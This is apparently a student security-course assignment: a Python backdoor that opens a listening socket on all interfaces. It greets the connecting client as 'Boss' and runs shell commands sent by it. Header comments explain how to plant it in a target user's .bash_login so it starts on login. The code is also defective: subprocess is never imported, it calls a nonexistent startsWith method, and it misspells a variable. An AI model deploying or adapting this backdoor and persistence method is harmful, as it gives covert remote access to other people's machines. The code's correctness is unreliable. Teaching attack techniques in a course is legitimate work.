###
# CPSC 526 - Assignment 1
# Group: Justin Berry, Andrew Lata
# This is a Python program that is meant to run as a process on a target machine
# It grants an attacking user a backdoor, providing an attacker with access to 
# some terminal commands
#
# To install this script to a linux user's profile, add '/path/to/backdoor.py'
# to the .bash_login file in the target user's home folder. If the file does not 
# exist, you can create it.
###

import socket
import getopt
import sys

# Sample usage
# get opts makes it easier to parse the program arguments
# backdoor.py -l -p 2017 -c     creates the backdoor listen server
# nc localhost 2017
# the client connecting to server (and to see a shell to run commands).


LISTEN = False
HOST = ''
PORT = 0
SHELL_COMMAND = ''


def start():
    global LISTEN
    global HOST
    global PORT
    global SHELL_COMMAND

    ## this is not working here, hard coded in port
    ## need to read documentation on get opt agan
    myopts, args = getopt.getopt(sys.argv[1:], "l:h:p")
    # o == option
    # a == argument
    for o, a in myopts:
        if o == '-l':
            LISTEN = True  # set the listen (server) flag
        # elif o == '-h':
        #    HOST = a
        elif o == '-p':
            PORT = a

    print("the port")
    print(PORT)
    # if true, run in netcat listen mode (server).
    if LISTEN == True:
        HOST = '0.0.0.0'
        PORT = 9700
        server_connector()


        # if false, run in netcat client mode
        # if LISTEN == False:


def server_connector():
    # Create a simple waiting loop for clients to connect to
    # the server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)  ## only need to allow 1 client connection
    print("Waiting for socket connection at " + HOST + ":" + str(PORT))

    while True:
        clientSocket, addr = server.accept()
        print("NC Client has connected via" + addr[0] + ":" + str(addr[1]))
        server_listener(clientSocket)


## this function deals with netcat commands from client connection
def server_listener(clientSocket):
    while True:
        clientSocket.send(bytearray("Welcome Boss: \n","utf-8"))
        bashCommand = ''
        while "\n" not in bashCommand:
            bashCommand = str(clientSocket.recv(1024))
        bashCommand = bashCommand.rstrip()
        print("Client Entered: " + bashCommand)

        try:
            if(bashCommand.startsWith('pwd')):
                output = subprocess.check_output('/bin/pwd', stderr=subprocess.STDOUT, shell=True)
            elif(bachCommand.startsWith('ls')):
                output = subprocess.check_output('/bin/ls', stderr=subprocess.STDOUT, shell=True)
        except:
            output = "Not a valid bash command \n"

        clientSocket.send(output)


if __name__ == '__main__':
    start()








